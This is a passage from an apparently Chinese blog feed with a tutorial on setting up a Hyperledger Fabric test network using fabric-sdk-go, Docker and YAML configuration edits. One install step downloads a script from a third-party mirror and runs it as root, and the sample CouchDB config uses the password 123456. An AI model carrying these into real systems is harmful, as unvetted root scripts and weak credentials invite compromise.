   <span class="attr">Specs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">Hostname:</span> <span class="string">orderer2</span></span><br></pre></td></tr></table></figure><hr><h2 id="源码">源码</h2><p>最后把整个项目源码附上，<a href="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/other/fabric-go-fabcar.zip">下载链接</a></p><p>为了减少压缩包大小，项目中移除了Tape性能测试工具，需要时自行配置。代码使用时需要将所有文件中与描述文件路径相关的源码全部替换为自己的工作目录，并且<code>fabric-samples</code>需要与本项目在统一根目录下。</p><h2 id="本文主要资料参考：">本文主要资料参考：</h2><p><a href="https://ifantasy.net/">Fantasy大佬的博客</a>     <a href="https://github.com/wefantasy/FabricLearn">(Github)FabricLearn-实现一个工作室联盟链</a></p><p><a href="https://www.cnblogs.com/yunqihao/p/16111993.html">hyperledger-fabric生产网络生成身份文件-yunqihao</a></p><p><a href="https://www.cnblogs.com/cbkj-xd/p/12170903.html">触不可及` 大佬的博客</a></p><p><a href="https://segmentfault.com/a/1190000023620220">进阶篇（一）Fabric 2.0 手动生成CA证书搭建Fabric网络-Raft协议-多orderer节点</a></p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
          <category> Hyperledger Fabric </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blockchain </tag>
            
            <tag> HyperLegder Fabric </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用fabric-sdk-go搭建Hyperledger Fabric测试环境</title>
      <link href="/posts/ceba00c5.html"/>
      <url>/posts/ceba00c5.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近在研究一些HyperLedger Fabric平台的相关内容，需要搭建出一个Fabric的运行环境进行测试，在此对搭建的过程进行一个记录与分享，如有不够完善或者做得不对的地方欢迎评论区留言讨论。目前的搭建计划是将利用Go版本的Fabric SDK，从最简单的单Orderer单通道单组织逐步扩充，最终实现多Orderer多通道多组织的Fabric网络环境。</p></blockquote><h2 id="基础环境">基础环境</h2><h3 id="1-安装Docker和Docker-Compose">1. 安装Docker和Docker Compose</h3><h4 id="安装Docker">安装Docker</h4><p>如果原先系统中存在docker，需要先进行卸载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io</span><br></pre></td></tr></table></figure><p>卸载完成后再进行安装，在测试或开发环境中 Docker 官方为了简化安装流程，提供了一套便捷的安装脚本，Ubuntu 系统上可以使用这套脚本安装，另外可以通过 <code>--mirror</code> 选项使用国内源进行安装：</p><blockquote><p>若安装测试版的 Docker, 脚本url为 <a href="http://test.docker.com">test.docker.com</a></p></blockquote><p><s>curl -fsSL <a href="http://get.docker.com">get.docker.com</a> -o <a href="http://get-docker.sh">get-docker.sh</a></s><br><s>sudo sh <a href="http://get-docker.sh">get-docker.sh</a> --mirror Aliyun</s></p><blockquote><p>[!NOTE]</p><p>2024年6月上面的链接因为某些原因已失效，临时采用下列方法安装</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://install.1panel.live/docker-install -o docker-install &amp;&amp; sudo bash ./docker-install &amp;&amp; rm -f ./docker-install</span><br></pre></td></tr></table></figure><blockquote><p>参考<a href="https://bbs.fit2cloud.com/t/topic/5891">大陆服务器安装docker的临时方法</a></p></blockquote><p>启动docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable docker</span><br><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure><p>允许非root用户使用docker需要将使用docker的用户添加到docker用户组：</p><p>建立docker组：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd docker</span><br></pre></td></tr></table></figure><p>将当前用户加入docker组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker $USER</span><br></pre></td></tr></table></figure><p>重启Ubuntu系统后生效</p><h4 id="安装Docker-Compose">安装Docker Compose</h4><p>从 <a href="https://github.com/docker/compose/releases">官方 GitHub Release</a> 处直接下载编译好的二进制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/v2.7.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"># 国内用户可以使用以下方式加快下载</span><br><span class="line">$ sudo curl -L https://download.fastgit.org/docker/compose/releases/download/v2.7.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h4 id="测试">测试</h4><p>使用命令输出版本信息，能正常输出则说明安装成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br><span class="line">docker-compose version</span><br></pre></td></tr></table></figure><h3 id="2-安装Go语言环境">2. 安装Go语言环境</h3><p>下载Go软件包并解压到<code>/usr/local</code>目录，下载前请访问<a href="https://golang.org/dl/">Go官方下载页面</a> 并检查是否有可用的新版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -c https://go.dev/dl/go1.18.4.linux-amd64.tar.gz -O - | sudo tar -xz -C /usr/local</span><br></pre></td></tr></table></figure><p>通过将 Go 目录的位置添加到<code>$PATH</code>环境变量中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.profile</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在打开的文件中附加下行</span></span><br><span class="line">export PATH=$PATH:/usr/local/go/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">文件保存后应用更改</span></span><br><span class="line">source ~/.profile</span><br></pre></td></tr></table></figure><p>验证安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go version</span><br></pre></td></tr></table></figure><h2 id="Fabric源码、Docker以及样例安装">Fabric源码、Docker以及样例安装</h2><h3 id="文件下载">文件下载</h3><p>添加工作目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p $HOME/go/src</span><br><span class="line">cd $HOME/go/src</span><br></pre></td></tr></table></figure><p>获取安装脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSLO https://raw.githubusercontent.com/hyperledger/fabric/main/scripts/install-fabric.sh &amp;&amp; chmod +x install-fabric.sh</span><br></pre></td></tr></table></figure><p>指定要下载的组件，需要在执行脚本时添加以下一个或多个参数。每个参数都可以缩短为它的第一个字母。</p><ul><li><code>docker</code>使用 Docker 下载 Fabric 容器镜像</li><li><code>podman</code>使用 podman 下载 Fabric Container Images</li><li><code>binary</code>下载 Fabric 二进制文件</li><li><code>samples</code>将 fabric-samples github repo 克隆到当前目录</li></ul><p>拉取最新版本的 Docker 容器并克隆示例存储库和二进制文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./install-fabric.sh d s b</span><br></pre></td></tr></table></figure><h3 id="使用Fabric测试网络">使用Fabric测试网络</h3><p>进入到测试网络目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd fabric-samples/test-network</span><br></pre></td></tr></table></figure><p>启动和停止测试网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./network.sh up</span><br><span class="line">./network.sh down</span><br></pre></td></tr></table></figure><p>测试过程出现报错的话需要修改host文件对<code>example.com</code>域名进行地址映射，在<code>/etc/hosts</code>文件中添加以下条目：</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1       orderer.example.com</span><br><span class="line">127.0.0.1       ca.org1.example.com</span><br><span class="line">127.0.0.1       ca.org2.example.com</span><br><span class="line">127.0.0.1       ca.org3.example.com</span><br><span class="line">127.0.0.1       peer0.org1.example.com</span><br><span class="line">127.0.0.1       peer0.org2.example.com</span><br><span class="line">127.0.0.1       peer0.org3.example.com</span><br><span class="line">127.0.0.1       peer1.org1.example.com</span><br><span class="line">127.0.0.1       peer1.org2.example.com</span><br><span class="line">127.0.0.1       peer1.org3.example.com</span><br></pre></td></tr></table></figure><h2 id="fabric-go-sdk-1-orderer-1-org-2-peers">fabric-go-sdk(1 orderer, 1 org, 2 peers)</h2><p>跟着sxguan的<a href="https://sxguan0529.gitbook.io/hyperledger-fabric/fabric-sdk-go">搭建过程</a>创建Fabric环境的话会出现很多问题，于是直接使用大佬在github上的<a href="https://github.com/sxguan/fabric-go-sdk">项目</a>进行修改</p><h3 id="修改配置文件">修改配置文件</h3><p>使用如下命令将项目文件拉到本地<code>$GOPATH/src</code>目录中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/sxguan/fabric-go-sdk.git</span><br></pre></td></tr></table></figure><p>下载完后需要对<code>config.yaml</code>和<code>main.go</code>中的路径配置进行修改（改到自己实际的项目路径）</p><p>将这两个文件中的<code>/root/go/src</code>全局替换为<code>/home/baymrx/go/src</code>，保存</p><p><strong>至此</strong>运行环境就没什么问题了</p><h3 id="运行项目">运行项目</h3><p>在项目根目录<code>$GOPATH/src/fabric-go-sdk</code>启动Docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd fixtures &amp;&amp; docker-compose up -d &amp;&amp; cd ..</span><br></pre></td></tr></table></figure><p>如果前面使用Fabric脚本完整安装过Docker环境，建议将<code>fixtures/docker-compose.yaml</code>文件中的镜像版本设置为<code>latest</code>，避免镜像的重复拉取</p><p>比如，将下面的镜像配置</p> <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">image:</span> <span class="string">hyperledger/fabric-orderer:2.2</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">hyperledger/fabric-peer:2.2</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">hyperledger/fabric-ca:1.4.9</span></span><br></pre></td></tr></table></figure><p>分别替换为</p> <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">image:</span> <span class="string">hyperledger/fabric-orderer:latest</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">hyperledger/fabric-peer:latest</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">hyperledger/fabric-ca:latest</span></span><br></pre></td></tr></table></figure><p>使用<code>go build</code>命令编译项目文件，运行完成后会在项目根目录中生成<code>fabric-go-sdk</code>文件</p><p><code>./fabric-go-sdk</code>执行文件就可以将代码顺利跑到最后</p><blockquote><p>运行结束后使用下面的命令结束并清理Docker环境</p><p><s>cd fixtures &amp;&amp; docker-compose down &amp;&amp; docker volume prune &amp;&amp; cd …</s></p><p><code>cd fixtures &amp;&amp; docker-compose down -v &amp;&amp; cd ..</code></p></blockquote><h2 id="fabric-go-sdk-1-orderer-2-orgs-2-peers">fabric-go-sdk(1 orderer, 2 orgs, 2 peers)</h2><p>2个组织的fabric网络的搭建，在之前1个组织的项目中对相关配置文件照葫芦画瓢即可，部分过程会参考sxguan的<a href="https://sxguan0529.gitbook.io/hyperledger-fabric/fabric-sdk-go">搭建过程</a></p><blockquote><p>配置文件中相关端口分配情况：</p><p>Peer0.Org1:70xx</p><p>Peer1.Org1:80xx</p><p>Peer0.Org2:90xx</p><p>Peer1.Org2:100xx</p></blockquote><h3 id="修改configtx-yaml">修改configtx.yaml</h3><p>这个文件包含了整个Fabric网络的定义，定义了网络组件的拓扑结构和每个网络实体加密证书的存储位置，一般用来配置系统通道初试区块文件、应用通道配置文件、锚节点配置文件等</p><p><strong>1、在Organization条目下复制一份Org1的配置，并将其中的org1替换为org2</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="meta">&amp;Org2</span></span><br><span class="line">    <span class="comment"># DefaultOrg defines the organization which is used in the sampleconfig</span></span><br><span class="line">    <span class="comment"># of the fabric.git development environment</span></span><br><span class="line">    <span class="attr">Name:</span> <span class="string">Org2MSP</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ID to load the MSP definition as</span></span><br><span class="line">    <span class="attr">ID:</span> <span class="string">Org2MSP</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">MSPDir:</span> <span class="string">crypto-config/peerOrganizations/org2.example.com/msp</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Policies defines the set of policies at this level of the config tree</span></span><br><span class="line">    <span class="comment"># For organization policies, their canonical path is usually</span></span><br><span class="line">    <span class="comment">#   /Channel/&lt;Application|Orderer&gt;/&lt;OrgName&gt;/&lt;PolicyName&gt;</span></span><br><span class="line">    <span class="attr">Policies:</span></span><br><span class="line">        <span class="attr">Readers:</span></span><br><span class="line">            <span class="attr">Type:</span> <span class="string">Signature</span></span><br><span class="line">            <span class="attr">Rule:</span> <span class="string">&quot;OR(&#x27;Org2MSP.member&#x27;)&quot;</span></span><br><span class="line">        <span class="attr">Writers:</span></span><br><span class="line">            <span class="attr">Type:</span> <span class="string">Signature</span></span><br><span class="line">            <span class="attr">Rule:</span> <span class="string">&quot;OR(&#x27;Org2MSP.member&#x27;)&quot;</span></span><br><span class="line">        <span class="attr">Admins:</span></span><br><span class="line">            <span class="attr">Type:</span> <span class="string">Signature</span></span><br><span class="line">            <span class="attr">Rule:</span> <span class="string">&quot;OR(&#x27;Org2MSP.admin&#x27;)&quot;</span></span><br><span class="line">        <span class="attr">Endorsement:</span></span><br><span class="line">            <span class="attr">Type:</span> <span class="string">Signature</span></span><br><span class="line">            <span class="attr">Rule:</span> <span class="string">&quot;OR(&#x27;Org2MSP.member&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leave this flag set to true.</span></span><br><span class="line">    <span class="attr">AnchorPeers:</span></span><br><span class="line">        <span class="comment"># AnchorPeers defines the location of peers which can be used</span></span><br><span class="line">        <span class="comment"># for cross org gossip communication.  Note, this value is only</span></span><br><span class="line">        <span class="comment"># encoded in the genesis block in the Application section context</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">Host:</span> <span class="string">peer0.org2.example.com</span></span><br><span class="line">          <span class="attr">Port:</span> <span class="number">9051</span></span><br></pre></td></tr></table></figure><p><strong>2、在Application下的Organization中添加Org2</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Application:</span> <span class="meta">&amp;ApplicationDefaults</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Organizations is the list of orgs which are defined as participants on</span></span><br><span class="line">    <span class="comment"># the application side of the network</span></span><br><span class="line">    <span class="attr">Organizations:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="meta">*Org1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="meta">*Org2</span></span><br></pre></td></tr></table></figure><p><strong>3、在Profiles条目中相对应位置添加Org2</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Profiles:</span></span><br><span class="line">    <span class="attr">TwoOrgsOrdererGenesis:</span></span><br><span class="line">        <span class="string">&lt;&lt;:</span> <span class="meta">*ChannelDefaults</span></span><br><span class="line">        <span class="attr">Orderer:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererDefaults</span></span><br><span class="line">            <span class="attr">Organizations:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="meta">*OrdererOrg</span></span><br><span class="line">            <span class="attr">Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererCapabilities</span></span><br><span class="line">        <span class="attr">Consortiums:</span></span><br><span class="line">            <span class="attr">SampleConsortium:</span></span><br><span class="line">                <span class="attr">Organizations:</span></span><br><span class="line">                    <span class="bullet">-</span> <span class="meta">*Org1</span></span><br><span class="line">                    <span class="bullet">-</span> <span class="meta">*Org2</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">TwoOrgsChannel:</span></span><br><span class="line">        <span class="attr">Consortium:</span> <span class="string">SampleConsortium</span></span><br><span class="line">        <span class="string">&lt;&lt;:</span> <span class="meta">*ChannelDefaults</span></span><br><span class="line">        <span class="attr">Application:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationDefaults</span></span><br><span class="line">            <span class="attr">Organizations:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="meta">*Org1</span></span><br><span class="line">                <span class="bullet">-</span> <span class="meta">*Org2</span></span><br><span class="line">            <span class="attr">Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationCapabilities</span></span><br></pre></td></tr></table></figure><h3 id="修改crypto-config-yaml">修改crypto-config.yaml</h3><p>crypto-config.yaml是MSP和TLS相关文件的依赖配置文件</p><p><strong>在PeerOrgs中复制一份并更改为Org2</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">Name:</span> <span class="string">Org2</span></span><br><span class="line">  <span class="attr">Domain:</span> <span class="string">org2.example.com</span></span><br><span class="line">  <span class="attr">EnableNodeOUs:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">Template:</span></span><br><span class="line">    <span class="attr">Count:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">Users:</span></span><br><span class="line">    <span class="attr">Count:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="修改docker-compose-yaml">修改docker-compose.yaml</h3><p><strong>1、volumes中添加Org2 的peer节点</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">peer0.org2.example.com:</span></span><br><span class="line"><span class="attr">peer1.org2.example.com:</span></span><br></pre></td></tr></table></figure><p><strong>2、services中添加Org2的peer节点和ca节点</strong></p><blockquote><p>根据端口分配情况首先将Org1中的90xx端口改为80xx，<s>为方便后续管理，将所有节点<code>environment</code>参数中变量的端口全部改为70xx，最后在<code>ports</code>再进行映射</s>（在同一主机的Docker环境下这样后面会报错）</p></blockquote><p>直接复制Org1节点的配置并将Org1替换为Org2（替换时注意区分大小写），然后修改对应端口即可</p><p><strong>3、在services中为Org2添加两个couchDB数据库</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">couchdb2:</span></span><br><span class="line">  <span class="attr">container_name:</span> <span class="string">couchdb2</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">hyperledger/fabric-couchdb:latest</span></span><br><span class="line">  <span class="comment"># Populate the COUCHDB_USER and COUCHDB_PASSWORD to set an admin user and password</span></span><br><span class="line">  <span class="comment"># for CouchDB.  This will prevent CouchDB from operating in an &quot;Admin Party&quot; mode.</span></span><br><span class="line">  <span class="attr">environment:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">COUCHDB_USER=admin</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">COUCHDB_PASSWORD=123456</span></span><br><span class="line">  <span class="comment"># Comment/Uncomment the port mapping if you want to hide/expose the CouchDB service,</span></span><br><span class="line">  <span class="comment"># for example map it to utilize Fauxton User Interface in dev environments.</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;9984:5984&quot;</span></span><br><span class="line">  <span class="attr">networks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">test</span></span><br><span class="line"></span><br><span class="line"><span class="attr">couchdb3:</span></span><br><span class="line">  <span class="attr">container_name:</span> <span class="string">couchdb3</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">hyperledger/fabric-couchdb:latest</span></span><br><span class="line">  <span class="comment"># Populate the COUCHDB_USER and COUCHDB_PASSWORD to set an admin user and password</span></span><br><span class="line">  <span class="comment"># for CouchDB.  This will prevent CouchDB from operating in an &quot;Admin Party&quot; mode.</span></span><br><span class="line">  <span class="attr">environment:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">COUCHDB_USER=admin</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">COUCHDB_PASSWORD=123456</span></span><br><span class="line">  <span class="comment"># Comment/Uncomment the port mapping if you want to hide/expose the CouchDB service,</span></span><br><span class="line">  <span class="comment"># for example map it to utilize Fauxton User Interface in dev environments.</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;10984:5984&quot;</span></span><br><span class="line">  <span class="attr">networks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">test</span></span><br></pre></td></tr></table></figure><h4 id="附上整个docker-compose-yaml文件">附上整个docker-compose.yaml文件</h4><p><a href="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/other/2orgs-docker-compose.yaml">链接</a></p><h3 id="重新生成证书文件和通道文件">重新生成证书文件和通道文件</h3><p>为避免后续调试的重复操作，将生成证书和通道文件的命令全部放到一个shell脚本中(<code>vim create.sh</code>)：</p><blockquote><p>执行下面的命令需要fabric-samples文件夹与fabric-go-sdk项目文件夹在同一父目录下，并且当前目录为<code>fixtures</code></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rm -rf crypto-config channel-artifacts &amp;&amp; mkdir crypto-config</span><br><span class="line">../../fabric-samples/bin/cryptogen generate --config=crypto-config.yaml</span><br><span class="line">../../fabric-samples/bin/configtxgen -profile TwoOrgsOrdererGenesis -outputBlock ./channel-artifacts/genesis.block -channelID fabric-channel</span><br><span class="line">../../fabric-samples/bin/configtxgen -profile TwoOrgsChannel -outputCreateChannelTx ./channel-artifacts/channel.tx -channelID mychannel</span><br><span class="line">../../fabric-samples/bin/configtxgen -profile TwoOrgsChannel -outputAnchorPeersUpdate ./channel-artifacts/Org1MSPanchors.tx -channelID mychannel -asOrg Org1MSP</span><br><span class="line">../../fabric-samples/bin/configtxgen -profile TwoOrgsChannel -outputAnchorPeersUpdate ./channel-artifacts/Org2MSPanchors.tx -channelID mychannel -asOrg Org2MSP</span><br></pre></td></tr></table></figure><p>执行脚本<code>./create.sh</code>重新生成证书和通道文件，回显中没有报错信息则说明生成成功</p><h3 id="修改config-yaml">修改config.yaml</h3><p><strong>1、在channels-mychannel-peers中添加org2</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">peer0.org2.example.com:</span></span><br><span class="line">  <span class="attr">endorsingPeer:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">chaincodeQuery:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">ledgerQuery:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">eventSource:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">peer1.org2.example.com:</span></span><br><span class="line">  <span class="attr">endorsingPeer:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">chaincodeQuery:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">ledgerQuery:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">eventSource:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>2、在organizations中添加org2</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">org2:</span></span><br><span class="line">  <span class="attr">mspid:</span> <span class="string">Org2MSP</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># This org&#x27;s MSP store (absolute path or relative to client.cryptoconfig)</span></span><br><span class="line">  <span class="attr">cryptoPath:</span>  <span class="string">peerOrganizations/org2.example.com/users/&#123;username&#125;@org2.example.com/msp</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">peers:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">peer0.org2.example.com</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">peer1.org2.example.com</span></span><br></pre></td></tr></table></figure><p><strong>3、在peers中添加org2</strong></p><blockquote><p>注意修改peer1.org1的端口为8051</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">peer0.org2.example.com:</span></span><br><span class="line">  <span class="comment"># this URL is used to send endorsement and query requests</span></span><br><span class="line">  <span class="comment"># [Optional] Default: Infer from hostname</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">peer0.org2.example.com:9051</span></span><br><span class="line">  <span class="attr">grpcOptions:</span></span><br><span class="line">    <span class="attr">ssl-target-name-override:</span> <span 